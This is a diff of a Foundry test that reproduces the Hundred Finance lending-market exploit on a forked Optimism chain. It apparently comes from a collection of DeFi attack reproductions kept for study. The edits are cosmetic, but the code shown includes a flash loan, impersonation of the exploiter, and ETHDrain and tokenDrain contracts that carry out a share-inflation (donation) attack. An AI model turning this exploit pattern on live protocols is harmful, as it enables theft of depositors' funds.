@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analysis
 // https://twitter.com/peckshield/status/1647307128267476992
@@ -40,34 +39,32 @@ contract contractTest is Test {
     address HundredFinanceExploiter = 0x155DA45D374A286d383839b1eF27567A15E67528;
     IChainlinkPriceOracleProxy priceOracle = IChainlinkPriceOracleProxy(0x10010069DE6bD5408A6dEd075Cf6ae2498073c73);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("optimism", 90_760_765);
-        cheats.label(address(WBTC), "WBTC");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(SNX), "SNX");
-        cheats.label(address(sUSD), "sUSD");
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(DAI), "DAI");
-        cheats.label(address(hWBTC), "hWBTC");
-        cheats.label(address(CEther), "CEther");
-        cheats.label(address(hSNX), "hSNX");
-        cheats.label(address(hUSDC), "hUSDC");
-        cheats.label(address(hDAI), "hDAI");
-        cheats.label(address(hUSDT), "hUSDT");
-        cheats.label(address(hSUSD), "hSUSD");
-        cheats.label(address(hFRAX), "hFRAX");
-        cheats.label(address(aaveV3), "aaveV3");
-        cheats.label(address(unitroller), "unitroller");
-        cheats.label(address(priceOracle), "ChainlinkPriceOracleProxy");
+        vm.createSelectFork("optimism", 90_760_765);
+        vm.label(address(WBTC), "WBTC");
+        vm.label(address(USDC), "USDC");
+        vm.label(address(SNX), "SNX");
+        vm.label(address(sUSD), "sUSD");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(DAI), "DAI");
+        vm.label(address(hWBTC), "hWBTC");
+        vm.label(address(CEther), "CEther");
+        vm.label(address(hSNX), "hSNX");
+        vm.label(address(hUSDC), "hUSDC");
+        vm.label(address(hDAI), "hDAI");
+        vm.label(address(hUSDT), "hUSDT");
+        vm.label(address(hSUSD), "hSUSD");
+        vm.label(address(hFRAX), "hFRAX");
+        vm.label(address(aaveV3), "aaveV3");
+        vm.label(address(unitroller), "unitroller");
+        vm.label(address(priceOracle), "ChainlinkPriceOracleProxy");
     }
 
     function testExploit() external {
         payable(address(0)).transfer(address(this).balance);
-        cheats.startPrank(HundredFinanceExploiter);
+        vm.startPrank(HundredFinanceExploiter);
         hWBTC.transfer(address(this), 1_503_167_295); // anti front-run
-        cheats.stopPrank();
+        vm.stopPrank();
         aaveV3.flashLoanSimple(address(this), address(WBTC), 500 * 1e8, new bytes(0), 0);
 
         emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
@@ -84,13 +81,11 @@ contract contractTest is Test {
         emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
     }
 
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initator,
-        bytes calldata params
-    ) external payable returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initator, bytes calldata params)
+        external
+        payable
+        returns (bool)
+    {
         hWBTC.redeem(hWBTC.balanceOf(address(this)));
 
         console.log("1. ETH Drain \r");
@@ -149,8 +144,8 @@ contract contractTest is Test {
         uint256 hTokenAmount = 1;
         uint256 liquidateAmount = 1e18
             / (
-                priceBorrowedMantissa * liquidationIncentiveMantissa
-                    / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)
+                (priceBorrowedMantissa * liquidationIncentiveMantissa)
+                    / ((exchangeRate * hTokenAmount * priceCollateralMantissa) / 1e18)
             ) + 1;
         return liquidateAmount;
     }
@@ -220,14 +215,14 @@ contract ETHDrain is Test {
         uint256 redeemAmount = donationAmount - 1;
         console.log(
             "Calculate the amount of shares represented by the redeem amount:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         console.log(
-            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2
+            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", (redeemAmount * 1e18) / exchangeRate_2
         );
         console.log(
             "Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         hWBTC.redeemUnderlying(redeemAmount);
         console2.log(
@@ -294,14 +289,14 @@ contract tokenDrain is Test {
         uint256 redeemAmount = donationAmount;
         console.log(
             "Calculate the amount of shares represented by the redeem amount:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         console.log(
-            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", redeemAmount * 1e18 / exchangeRate_2
+            "another way of calculating, redeemAmount * 1e18 / exchangeRate:", (redeemAmount * 1e18) / exchangeRate_2
         );
         console.log(
             "Due to the inflation attack, the attacker redeems all previously donated WBTC with a calculated share of:",
-            redeemAmount * hWBTC.totalSupply() / WBTCAmountInhWBTC
+            (redeemAmount * hWBTC.totalSupply()) / WBTCAmountInhWBTC
         );
         hWBTC.redeemUnderlying(redeemAmount);
         console2.log(
